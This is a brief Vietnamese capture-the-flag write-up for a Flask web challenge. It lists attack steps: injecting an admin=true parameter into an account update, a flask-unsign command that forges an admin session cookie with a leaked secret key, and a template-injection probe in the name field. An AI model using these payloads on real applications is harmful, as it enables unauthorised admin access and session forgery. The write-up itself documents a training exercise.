# giới thiệu
có một số chức năng: đăng kí, đăng nhập, update account
# solution
trong phần update account thêm vào param admin=true
final payload 
```&admin=true```
flask-unsign -S 'amorlove'  -s  -c "{'is_admin': True, 'user_id': '2', 'username': 'admin'}"
go to /dashboard
ssti in name => {{self.__dict__}}
# lưu ý sau khi làm những bài này
dumedeohoplygica
